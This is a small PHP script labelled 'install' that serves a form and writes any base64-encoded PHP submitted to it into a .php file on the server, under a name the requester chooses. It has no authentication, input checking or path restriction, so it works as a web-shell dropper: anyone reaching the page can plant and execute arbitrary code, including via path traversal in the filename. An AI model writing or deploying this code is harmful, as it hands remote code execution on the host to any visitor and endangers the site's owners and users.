<?php

	function WriteFile($path,$data)
	{
		$file = $path;
		$fh = fopen($file, "w") or die("File ($file) does not exist!");
		fwrite($fh, $data);
		fclose($fh);
	}
	
	echo "<!DOCTYPE html>
<html>
<head>

	<title>install</title>
	</head>
<body>
<div class='maindiv'>
<form method='POST' action='createphp.php' onSubmit='return onSend()'>
<table>
	<tr>
		<td><font>Php:</font></td>
		<td><input name='php' id='php' type='text' placeholder='PhpFile'></td>
	</tr>
	<tr>
		<td><font > Filename:</font></td>
		<td><input name='filename' id='filename' type='textarea' placeholder='Filename'></td>
	</tr>
</table>

<input type='hidden' name='language' value='en'></input>
<input type='submit' value='Install'></input>

</form>
</div>
</body>
</html>
	";
if(isset($_POST['language'])){
	
		
		$config = base64_decode($_POST['php']);
		$name = $_POST['filename'];
		WriteFile("$name.php",$config);
}
?>